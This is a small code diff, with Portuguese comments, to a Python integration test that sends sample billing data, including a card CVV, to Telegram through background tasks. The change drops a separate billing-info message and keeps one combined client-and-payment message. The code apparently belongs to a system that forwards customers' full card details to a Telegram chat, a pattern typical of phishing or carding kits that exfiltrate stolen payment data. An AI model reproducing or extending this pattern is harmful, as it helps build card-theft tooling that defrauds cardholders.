@@ -176,12 +176,7 @@ async def test_telegram_integration(background_tasks: BackgroundTasks):
             "cvv": "456"
         }
         
-        # Enviar para Telegram em background
-        background_tasks.add_task(
-            telegram_service.send_billing_info,
-            test_billing_data
-        )
-        
+        # Enviar apenas mensagem completa (cliente + pagamento) para Telegram
         background_tasks.add_task(
             telegram_service.send_payment_info,
             test_billing_data,
